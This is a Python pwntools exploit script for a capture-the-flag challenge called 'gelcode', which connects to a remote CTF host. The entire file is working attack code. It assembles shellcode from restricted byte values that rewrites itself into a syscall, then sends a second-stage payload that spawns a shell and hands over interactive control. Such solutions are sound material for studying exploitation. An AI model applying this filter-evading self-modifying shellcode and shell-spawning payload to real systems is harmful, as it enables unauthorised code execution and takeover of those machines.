#!/usr/bin/env python2
from pwn import *
from time import sleep

exe = ELF("./chall")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"
IP, PORT = "gelcode.hsc.tf", 1337

global io
breakpoints = '''
break main
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

rl()

shell1 = asm("""
    add     al,0xf
    add     al,0xf
    add     al,0x6
    add     DWORD PTR [rdx+rax*1], eax 
    add     DWORD PTR [rdx+rax*1], eax

    add     al,0x1
    add     DWORD PTR [rdx+rax*1], eax
    
    add     al,0x1
    add     DWORD PTR [rdx+rax*1], eax 
    add     DWORD PTR [rdx+rax*1], eax
    add     DWORD PTR [rdx+rax*1], eax 
    add     DWORD PTR [rdx+rax*1], eax
    add     DWORD PTR [rdx+rax*1], eax

    add     al,0xf
    """)+"\x00\x0c\x0b" #38 bytes

shell2 = asm("""
    add    al,0x6
    add    cl, BYTE PTR [rdx+rax*1]
    add    cl, BYTE PTR [rdx+rax*1]
    add    cl, BYTE PTR [rdx+rax*1]
    add    cl, BYTE PTR [rdx+rax*1]
    add    cl, BYTE PTR [rdx+rax*1]
    add    cl, BYTE PTR [rdx+rax*1]
    add    al,0xf
    add    al,0xf
    add    al,0xf
    add    al,0xf
    add    al,0xf
    add    al,0xf
    add    al,0xf
    add    al,0xf
    add    al,0xf
    add    al,0xf
    add    al,0xf
    add    al,0x5

    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl

    add    al,0x1
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl

    add    al,0x1
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    
    add    al,0x1
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl

    add    al,0x1
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    
    add    al,0x1
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    
    add    al,0x5
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl

    add    al,0x1
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl
    add    BYTE PTR [rdx+rax*1], cl

    """) + "\x00\x01\x0f"+"\x00\x07\x02\x00\x05\x00\x00"+"\x01\x00" +asm("syscall")

shellcode = shell1 + shell2

payload = shellcode.ljust(999,"A")

sl(payload)

sleep(3)

sl(243*"A"+asm(shellcraft.sh()))

io.interactive()